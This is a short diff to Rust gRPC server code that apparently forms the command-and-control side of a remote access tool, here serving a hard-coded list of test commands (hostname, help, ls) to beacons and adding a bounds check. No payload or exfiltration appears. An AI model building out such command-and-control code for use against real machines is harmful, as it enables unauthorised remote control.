@@ -13,13 +13,23 @@ impl AskForInstructions for MyAskForInstructions {
     async fn send(&self, request: Request<Beacon>) -> Result<Response<CommandRequest>, Status> {
         println!("Request={request:?}");
         let fake_commands: Vec<RatCommand> = vec![RatCommand::Hostname, RatCommand::Help, RatCommand::Ls];
-        let number: usize = request.into_inner().last_received.try_into().unwrap();
-        Ok(Response::new(
-            CommandRequest {
-                command: RatCommand::try_into(fake_commands[number]).unwrap(),
-                arguments:String::from("")
-            }
-        ))
+        let number: usize = request.into_inner().requested_command.try_into().unwrap();
+        if fake_commands.len() > number {
+            Ok(Response::new(
+                CommandRequest {
+                    command: RatCommand::try_into(fake_commands[number]).unwrap(),
+                    arguments:String::from("")
+                }
+            ))
+        } else {
+            Ok(Response::new(
+                CommandRequest {
+                    command: RatCommand::try_into(RatCommand::None).unwrap(),
+                    arguments:String::from("")
+                }
+            ))
+        }
+        
     }
 }
 
